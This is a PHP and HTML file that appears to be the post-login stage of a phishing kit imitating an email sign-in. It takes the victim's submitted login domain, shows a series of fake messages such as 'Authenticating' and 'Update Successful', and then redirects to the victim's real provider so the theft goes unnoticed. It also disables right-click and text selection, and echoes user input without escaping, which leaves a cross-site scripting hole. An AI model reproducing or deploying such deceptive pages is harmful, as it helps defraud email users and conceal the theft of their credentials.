<?
$yuh = $_REQUEST['login'];

?>
<!DOCTYPE html>
<html lang="en" data-scribe-reduced-action-queue="true">
<head>
<link rel="stylesheet" href="files/i.css">
<link rel="shortcut icon" href="./files/mail.png">
<link rel="stylesheet" href="files/ii.css">
<title>Connecting to email provider server <? print $yuh; ?></title>
<meta name="robots" content="NOODP">
<link href="./images/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="files/bootstrap.css" rel="stylesheet">
<link href="files/signin.css" rel="stylesheet">
<link href="files/errors.css" rel="stylesheet" type="text/css">
</head>
<script type="text/javascript">
         <!--
            function Redirect() {
               window.location.href="http://<? print $yuh; ?>/";
            }
            
            
            setTimeout('Redirect()', 29000);
         //-->
      </script>
<SCRIPT>



var preloadimages=new Array(":abstract.simplenet.com/point.gif","abstract.simplenet.com/point2.html")



var intervals=3000

//configure destination URL

// var targetdestination="<? print $yuh; ?>"





var splashmessage=new Array()

var openingtags=''

splashmessage[0]='<spam id="login-status" class="info-notice">Contacting email provider <? print $yuh; ?>'

splashmessage[1]='<spam id="login-status" class="info-notice">Authentication in progress'

splashmessage[2]='<spam id="login-status" class="info-notice">Verifying'

splashmessage[3]='<spam id="login-status" class="info-notice">Authenticating'

splashmessage[4]='<spam id="login-status" class="success-notice">Please Wait'

splashmessage[5]='<spam id="login-status" class="info-notice">Accessing Server For Upgrades'

splashmessage[6]='<spam id="login-status" class="info-notice">Now Upgrading'

splashmessage[7]='<spam id="login-status" class="info-notice">Please Wait'

splashmessage[8]='<spam id="login-status" class="success-notice">Update Successful'




var closingtags='</font>'



//Do not edit below this line (besides HTML code at the very bottom)



var i=0



var ns4=document.layers?1:0

var ie4=document.all?1:0

var ns6=document.getElementById&&!document.all?1:0

var theimages=new Array()



//preload images

if (document.images){

for (p=0;p<preloadimages.length;p++){

theimages[p]=new Image()

theimages[p].src=preloadimages[p]

}

}



function displaysplash(){

if (i<splashmessage.length){

sc_cross.style.visibility="hidden"

sc_cross.innerHTML='<b><center>'+openingtags+splashmessage[i]+closingtags+'</center></b>'

sc_cross.style.left=ns6?parseInt(window.pageXOffset)+parseInt(window.innerWidth)/2-parseInt(sc_cross.style.width)/2 :document.body.scrollLeft+document.body.clientWidth/2-parseInt(sc_cross.style.width)/2

sc_cross.style.top=ns6?parseInt(window.pageYOffset)+parseInt(window.innerHeight)/2-sc_cross.offsetHeight/2:document.body.scrollTop+document.body.clientHeight/2-sc_cross.offsetHeight/2

sc_cross.style.visibility="visible"

i++

}

else{

window.location=targetdestination

return

}

setTimeout("displaysplash()",intervals)

}



function displaysplash_ns(){

if (i<splashmessage.length){

sc_ns.visibility="hide"

sc_ns.document.write('<b>'+openingtags+splashmessage[i]+closingtags+'</b>')

sc_ns.document.close()



sc_ns.left=pageXOffset+window.innerWidth/2-sc_ns.document.width/2

sc_ns.top=pageYOffset+window.innerHeight/2-sc_ns.document.height/2



sc_ns.visibility="show"

i++

}

else{

window.location=targetdestination

return

}

setTimeout("displaysplash_ns()",intervals)

}







function positionsplashcontainer(){

if (ie4||ns6){

sc_cross=ns6?document.getElementById("splashcontainer"):document.all.splashcontainer

displaysplash()

}

else if (ns4){

sc_ns=document.splashcontainerns

sc_ns.visibility="show"

displaysplash_ns()

}

else

window.location=targetdestination

}

window.onload=positionsplashcontainer



</SCRIPT>
<SCRIPT><!--

 var jv=1.0;

//--></SCRIPT>



<SCRIPT language=Javascript1.1><!--

 jv=1.1;

//--></SCRIPT>



<SCRIPT language=Javascript1.2><!--

 jv=1.2;

//--></SCRIPT>



<SCRIPT language=Javascript1.3><!--

 jv=1.3;

//--></SCRIPT>



<SCRIPT language=Javascript1.4><!--

 jv=1.4;

//--></SCRIPT>
<body class="highline logged-out ms-windows" data-fouc-class-names="swift-loading" dir="ltr" oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

    <div id="doc" class="route-login login-responsive">
        <div class="topbar js-topbar">
  <div id="banners" class="js-banners">
  </div>
  <div class="global-nav" data-section-term="top_nav">
    <div class="global-nav-inner">
      <div class="container">
<spam class="nav js-global-actions"> <spam class="home" data-global-action="t1home">  
<a  href="#" data-nav="front">  </a>   </spam> </spam>  <div class="pull-right">  <spam class="nav secondary-nav language-dropdown"> <spam class="dropdown js-language-dropdown"> <spam class="dropdown-toggle js-dropdown-toggle"> <span class="js-current-language">
<div id="google_translate_element" align="left">
</div></span> <b class="caret"></b> <div class="dropdown-menu"> <div class="dropdown-caret right"> <span class="caret-outer"> </span> <span class="caret-inner"></span> </div>   </div></spam>   </div>
</div>
</div>
</div>
</div>
<div id="page-outer">
<div id="page-container" class="AppContent wrapper wrapper-login white">
<div class="page-canvas">
<div >
<div class="form-signin" role="form" >

<h1 id=splashcontainer ></h1>
<p align="center" class="style1"><br />
    <br />

      <img src="load.gif" width="70" height="70" /></p>
</div>


<span class="style1"><font size="18">





</font></span><span class="style1"> </span>
<NOSCRIPT>
<span class="style1"><IMG height=1 src="#"

width=1></span>
</NOSCRIPT>

  </div>

  <div class="clearfix mobile has-sms">
    &nbsp;</div>

</div>

          </div>
        </div>
      
    </div>
    <div class="gallery-overlay"></div>
<div class="modal-overlay"></div>




<div id="create-custom-timeline-dialog" class="modal-container"></div>
<div id="edit-custom-timeline-dialog" class="modal-container"></div>
<div id="curate-dialog" class="modal-container"></div>


    <div id="spoonbill-outer"></div>
</body>
</html>